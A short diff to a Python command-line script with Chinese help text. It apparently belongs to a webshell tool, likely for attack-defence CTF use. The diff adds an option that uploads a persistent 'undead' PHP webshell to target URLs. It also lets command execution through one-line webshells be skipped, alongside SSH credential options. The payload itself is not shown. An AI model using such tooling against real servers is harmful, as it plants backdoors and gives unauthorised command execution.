@@ -20,6 +20,7 @@ if __name__ == '__main__':
                         help='要使用的 HTTP 方法（GET 或 POST）。')
     parser.add_argument('-s', '--use_system', action='store_true', help='使用 system 函数而不是 eval。')
     parser.add_argument('-c', '--command', type=str, help='需要执行的命令。')
+    parser.add_argument('--inject', action='store_true', default=False, help='是否注入不死马')
     parser.add_argument('--ssh_port', type=int, default=22, help='SSH 用户名')
     parser.add_argument('--ssh_username', type=str, default='root', help='SSH 用户名')
     parser.add_argument('--ssh_password', type=str, help='SSH 密码')
@@ -36,14 +37,15 @@ if __name__ == '__main__':
         manager.add(args.add)
     if args.remove:
         manager.remove(args.remove)
-    if not args.command:
-        print('[-]必须使用 -c 指定需要执行的命令。')
-        exit(1)
     if args.path:
         manager.generate_urls(args.port, args.path)
         manager.save_urls_to_file()
+        php_con = PHPConnectionTester()
+        if args.inject:
+            php_con.upload(key=args.key, port=args.port, method=args.method, use_system=args.use_system)
+        else:
+            rich.print("[*]未指定web服务不死马注入，跳过注入。")
         if args.command:
-            php_con = PHPConnectionTester()
             php_con.test_all_urls(key=args.key, command=args.command, method=args.method, use_system=args.use_system)
         else:
             rich.print("[*]未指定web服务执行命令，跳过php一句话连接")
